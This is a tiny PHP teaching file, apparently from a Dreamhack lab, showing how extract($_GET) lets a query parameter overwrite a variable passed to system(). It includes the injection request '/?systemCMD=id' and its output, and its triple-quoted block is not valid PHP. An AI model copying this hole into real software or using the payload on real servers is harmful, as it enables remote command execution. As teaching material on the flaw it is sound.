<?php
'''
$size = "large";
$var_array = array("color" => "blue",
                   "size"  => "medium",
                   "shape" => "sphere");
extract($var_array);
echo "$color, $size, $shape\n"; // blue, medium, sphere
'''
$systemCMD = "ping 127.0.0.1";

extract($_GET);

system($systemCMD);
/*
/?systemCMD=id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
*/


?>
